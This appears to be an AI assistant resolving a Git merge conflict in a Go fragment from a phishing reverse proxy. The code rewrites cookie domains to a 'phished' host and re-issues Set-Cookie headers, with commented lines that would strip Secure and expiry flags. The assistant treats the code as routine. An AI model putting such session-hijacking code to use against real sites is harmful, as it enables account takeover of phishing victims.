Looking at this merge conflict, I can see that:

1. The HEAD version (current branch) has no additional code between the closing braces and the `ck.Domain` line
2. The incoming branch (b4883fe54e2b06602fc05c2787487d71b9353301) adds commented-out code that appears to modify cookie properties

Since the incoming changes are all commented out, they appear to be debug code or temporarily disabled functionality. The semantic intent seems to be to preserve this commented code for potential future use or reference.

Here's the resolved version:

```go
							}
						}
					}
				}

				//ck.Secure = false
				//ck.MaxAge = 0
				//if time.Now().Before(ck.Expires) {
				//	ck.Expires, _ = time.Parse("1600-01-01", "1600-01-01")
				//}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())
```
